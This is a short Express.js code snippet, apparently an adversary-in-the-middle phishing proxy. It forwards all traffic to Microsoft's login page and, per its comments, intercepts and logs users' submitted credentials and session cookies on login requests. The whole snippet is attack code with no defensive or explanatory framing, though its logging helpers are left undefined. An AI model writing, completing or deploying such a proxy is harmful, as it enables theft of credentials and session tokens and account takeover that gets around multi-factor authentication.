app.use('/', (req, res) => {
  // Forward all requests to login.microsoftonline.com
  let targetUrl = 'https://login.microsoftonline.com' + req.url;
  let options = { headers: req.headers, method: req.method, body: req.body };
  fetch(targetUrl, options).then(proxyRes => {
    // Intercept credentials and session cookies
    if (req.url.includes('login')) {
      logCredentials(req.body);
      logCookies(proxyRes.headers['set-cookie']);
    }
    res.send(proxyRes.body);
  });
});

